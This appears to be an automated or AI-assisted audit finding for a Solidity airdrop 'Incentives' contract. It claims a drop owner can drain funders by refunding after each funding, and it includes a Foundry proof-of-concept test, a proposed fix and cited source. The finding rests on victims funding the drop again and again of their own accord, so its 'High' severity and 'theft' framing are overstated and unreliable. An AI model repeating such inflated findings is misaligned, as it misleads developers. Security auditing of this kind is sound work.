## Title
Drop Owner Can Drain Non-Owner Funders Through Repeated Fund-Refund Cycles

## Summary
The `Incentives` contract allows anyone to fund a drop via the `fund()` function, but only the drop owner can call `refund()` which resets the funded amount. [1](#0-0) [2](#0-1)  This design enables malicious drop owners to repeatedly drain non-owner funders by alternating between allowing funding and immediately refunding, extracting the funder's tokens without providing proportional benefit to the intended airdrop recipients.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Incentives.sol` - `fund()` function (lines 20-42) and `refund()` function (lines 45-71)

**Intended Logic:** The Incentives contract is designed to allow airdrops where anyone can contribute funds to reach a minimum threshold, and the owner can later reclaim unused funds after claims are processed.

**Actual Logic:** The combination of permissionless funding and owner-only refunding creates an exploitable loop:
- `fund()` has no access control and allows anyone to add tokens to a drop [3](#0-2) 
- `refund()` is restricted to the drop owner only [4](#0-3) 
- When `refund()` executes, it sends tokens to the owner and resets `funded` to equal `claimed` [5](#0-4) 
- After refunding, the funded amount is reset, allowing the same funder to contribute again

**Exploitation Path:**
1. Attacker (Bob) creates a drop with himself as owner: `DropKey{owner: Bob, token: TOKEN, root: ROOT}`
2. Victim (Alice) calls `fund(dropKey, 100)` - Alice transfers 100 tokens to contract, `funded` = 100
3. Bob immediately calls `refund(dropKey)` - Bob receives 100 tokens (line 68), `funded` is reset to 0 (line 61) [6](#0-5) 
4. Alice calls `fund(dropKey, 100)` again - Alice transfers another 100 tokens, `funded` = 100
5. Bob calls `refund(dropKey)` again - Bob receives another 100 tokens
6. Repeat steps 4-5 until Alice's balance is drained

**Security Property Broken:** This violates the fundamental expectation that funding an airdrop contributes to the drop's value for claimants. Instead, funds are extracted by the owner without benefiting the intended recipients, constituting direct theft of user funds.

## Impact Explanation
- **Affected Assets**: Any ERC20 tokens used in malicious drops; specifically tokens transferred by non-owner funders
- **Damage Severity**: Complete loss of funder's balance. If Alice funds with 1000 tokens across multiple cycles, Bob extracts all 1000 tokens while the drop maintains 0 actual funding for claimants
- **User Impact**: Any user who funds a drop they don't own is at risk. This particularly affects community members trying to support legitimate-looking airdrops, or protocols attempting to add incentives to third-party drops

## Likelihood Explanation
- **Attacker Profile**: Any drop owner can exploit this. The attacker needs to create a drop and socially engineer or incentivize victims to fund it
- **Preconditions**: 
  - Drop must be created (trivial, anyone can create via merkle root)
  - Victim must fund the drop (requires social engineering or genuine belief the drop is legitimate)
  - No claims need to have occurred (initial state with `claimed = 0` maximizes extraction)
- **Execution Complexity**: Single transaction per refund cycle. Attacker can execute immediately after each funding or batch multiple refunds
- **Frequency**: Can be exploited continuously until victim's balance is exhausted or they stop funding

## Recommendation

Add access control to the `fund()` function to restrict funding to the drop owner only:

```solidity
// In src/Incentives.sol, function fund, line 20:

// CURRENT (vulnerable):
function fund(DropKey memory key, uint128 minimum) external override returns (uint128 fundedAmount) {
    bytes32 id = key.toDropId();
    // ... rest of function

// FIXED:
function fund(DropKey memory key, uint128 minimum) external override returns (uint128 fundedAmount) {
    // Restrict funding to drop owner only
    if (msg.sender != key.owner) {
        revert DropOwnerOnly();
    }
    
    bytes32 id = key.toDropId();
    // ... rest of function unchanged
```

This ensures only the owner who can refund is also the one who funds, eliminating the attack vector. If permissionless funding is desired for legitimate use cases, consider alternative mitigations:
- Track funding sources and restrict refunds to proportional contributions
- Add a timelock between funding and refunding
- Implement a whitelist of approved funders per drop

## Proof of Concept

```solidity
// File: test/Exploit_FundRefundDrain.t.sol
// Run with: forge test --match-test test_FundRefundDrain -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Incentives.sol";
import "../src/types/dropKey.sol";
import "./TestToken.sol";

contract Exploit_FundRefundDrain is Test {
    Incentives incentives;
    TestToken token;
    
    address bob = makeAddr("bob"); // Malicious drop owner
    address alice = makeAddr("alice"); // Victim funder
    
    function setUp() public {
        incentives = new Incentives();
        token = new TestToken(address(this));
        
        // Give Alice tokens to fund
        token.transfer(alice, 1000e18);
    }
    
    function test_FundRefundDrain() public {
        // SETUP: Bob creates a drop with himself as owner
        DropKey memory dropKey = DropKey({
            owner: bob,
            token: address(token),
            root: keccak256("merkle_root")
        });
        
        uint256 aliceInitialBalance = token.balanceOf(alice);
        uint256 bobInitialBalance = token.balanceOf(bob);
        
        // EXPLOIT CYCLE 1: Alice funds 100, Bob refunds
        vm.startPrank(alice);
        token.approve(address(incentives), 100e18);
        incentives.fund(dropKey, 100e18);
        vm.stopPrank();
        
        assertEq(token.balanceOf(address(incentives)), 100e18, "Contract should have 100 tokens");
        
        vm.prank(bob);
        uint128 refunded1 = incentives.refund(dropKey);
        
        assertEq(refunded1, 100e18, "Bob should receive 100 tokens");
        assertEq(token.balanceOf(bob), bobInitialBalance + 100e18, "Bob balance increased");
        assertEq(token.balanceOf(address(incentives)), 0, "Contract emptied");
        
        // EXPLOIT CYCLE 2: Alice funds 100 again, Bob refunds again
        vm.startPrank(alice);
        token.approve(address(incentives), 100e18);
        incentives.fund(dropKey, 100e18);
        vm.stopPrank();
        
        vm.prank(bob);
        uint128 refunded2 = incentives.refund(dropKey);
        
        // VERIFY: Bob extracted 200 total, Alice lost 200, drop has 0 value
        assertEq(token.balanceOf(bob), bobInitialBalance + 200e18, "Bob extracted 200 tokens total");
        assertEq(token.balanceOf(alice), aliceInitialBalance - 200e18, "Alice lost 200 tokens");
        assertEq(token.balanceOf(address(incentives)), 0, "Drop has no value for claimants");
        
        console.log("Vulnerability confirmed:");
        console.log("Alice paid:", 200e18);
        console.log("Bob extracted:", 200e18);
        console.log("Drop value for claimants:", 0);
    }
}
```

## Notes

The vulnerability stems from the asymmetry between permissionless funding and owner-restricted refunding. The `refund()` function's state reset [6](#0-5)  enables repeated exploitation by resetting `funded` to `claimed`, allowing the same minimum threshold to be funded multiple times by the victim. 

This issue directly answers the security question: repeated funding calls CAN drain the funder's balance without proportional benefit because the owner can extract funds via `refund()` between funding calls, preventing the drop from accumulating value for its intended purpose (airdrop claims).

### Citations

**File:** src/Incentives.sol (L20-42)
```text
    function fund(DropKey memory key, uint128 minimum) external override returns (uint128 fundedAmount) {
        bytes32 id = key.toDropId();

        // Load drop state from storage slot: drop id
        DropState dropState;
        assembly ("memory-safe") {
            dropState := sload(id)
        }

        uint128 currentFunded = dropState.funded();
        if (currentFunded < minimum) {
            fundedAmount = minimum - currentFunded;
            dropState = dropState.setFunded(minimum);

            // Store updated drop state
            assembly ("memory-safe") {
                sstore(id, dropState)
            }

            SafeTransferLib.safeTransferFrom(key.token, msg.sender, address(this), fundedAmount);
            emit Funded(key, minimum);
        }
    }
```

**File:** src/Incentives.sol (L45-71)
```text
    function refund(DropKey memory key) external override returns (uint128 refundAmount) {
        if (msg.sender != key.owner) {
            revert DropOwnerOnly();
        }

        bytes32 id = key.toDropId();

        // Load drop state from storage slot: drop id
        DropState dropState;
        assembly ("memory-safe") {
            dropState := sload(id)
        }

        refundAmount = dropState.getRemaining();
        if (refundAmount > 0) {
            // Set funded amount to claimed amount (no remaining funds)
            dropState = dropState.setFunded(dropState.claimed());

            // Store updated drop state
            assembly ("memory-safe") {
                sstore(id, dropState)
            }

            SafeTransferLib.safeTransfer(key.token, key.owner, refundAmount);
        }
        emit Refunded(key, refundAmount);
    }
```
